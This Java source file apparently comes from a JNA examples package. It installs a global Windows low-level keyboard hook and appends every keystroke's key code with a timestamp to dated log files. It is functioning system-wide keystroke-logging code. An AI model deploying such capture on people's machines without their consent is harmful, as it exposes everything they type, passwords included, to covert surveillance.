package com.hy.newJna_examples;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HMODULE;
import com.sun.jna.platform.win32.WinDef.LRESULT;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinUser.HHOOK;
import com.sun.jna.platform.win32.WinUser.KBDLLHOOKSTRUCT;
import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
import com.sun.jna.platform.win32.WinUser.MSG;
import com.sun.jna.platform.win32.WinDef.LPARAM;
  
//import com.sun.jna.examples.win32.Kernel32;  
//import com.sun.jna.examples.win32.User32;  
//import com.sun.jna.examples.win32.User32.HHOOK;  
//import com.sun.jna.examples.win32.User32.KBDLLHOOKSTRUCT;  
//import com.sun.jna.examples.win32.User32.LowLevelKeyboardProc;  
//import com.sun.jna.examples.win32.User32.MSG;  
//import com.sun.jna.examples.win32.W32API.HMODULE;  
//import com.sun.jna.examples.win32.W32API.LRESULT;  
//import com.sun.jna.examples.win32.W32API.WPARAM;  
  
  
public class KeyboardHook implements Runnable{  
  
    private static HHOOK hhk;  
    private static LowLevelKeyboardProc keyboardHook;  
    final static User32 lib = User32.INSTANCE;  
    private boolean [] on_off=null;  
  
    public KeyboardHook(boolean [] on_off){  
        this.on_off = on_off;  
    }  
//	if(event.vkCode == 117){
//	key = key + "f";
//}else if(event.vkCode == 118){
//	key = key + "8";
//}else{
//	key = "";
//}

	//按键
//	if(key.equals("f8") || key.equals("8f")){//F6 显示隐藏精灵
//		setFlag(!flag);
//		key = "";
//	}else if(!"f8".contains(key)){
//		key = "";
//	}
    public void run() {  
  
        HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);  
        keyboardHook = new LowLevelKeyboardProc() {  
            public LRESULT callback(int nCode, WPARAM wParam, KBDLLHOOKSTRUCT info) {  
                SimpleDateFormat df1 = new SimpleDateFormat("yyyy-MM-dd");  
                SimpleDateFormat df2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");  
                String fileName=df1.format(new Date());  
                String time=df2.format(new Date());  
                BufferedWriter bw1=null;  
                BufferedWriter bw2=null;  
                try {  
                    bw1=new BufferedWriter(new FileWriter(new File(".//log//"+fileName+"_Keyboard.txt"),true));  
                    bw2=new BufferedWriter(new FileWriter(new File(".//log//"+fileName+"_Common.txt"),true));  
                  
                } catch (IOException e) {  
                    e.printStackTrace();  
                }  
                if (on_off[0] == false) {  
                    System.exit(0);  
                }  
                try {  
                    bw1.write(time+"  ####  "+info.vkCode+"\r\n");  
                    bw2.write(time+"  ####  "+info.vkCode+"\r\n");  
                    bw1.flush();  
                    bw2.flush();  
                } catch (IOException e) {  
                    e.printStackTrace();  
                }  
                Pointer ptr = info.getPointer();
				long peer = Pointer.nativeValue(ptr);
//                return lib.CallNextHookEx(hhk, nCode, wParam, info.getPointer());  
                return lib.CallNextHookEx(hhk, nCode, wParam, new LPARAM(peer));
            }  
        };  
        hhk = lib.SetWindowsHookEx(User32.WH_KEYBOARD_LL, keyboardHook, hMod, 0);  
        int result;  
        MSG msg = new MSG();  
        while ((result = lib.GetMessage(msg, null, 0, 0)) != 0) {  
            if (result == -1) {  
                System.err.println("error in get message");  
                break;  
            } else {  
                System.err.println("got message");  
                lib.TranslateMessage(msg);  
                lib.DispatchMessage(msg);  
            }  
        }  
        lib.UnhookWindowsHookEx(hhk);  
    }  
  
}  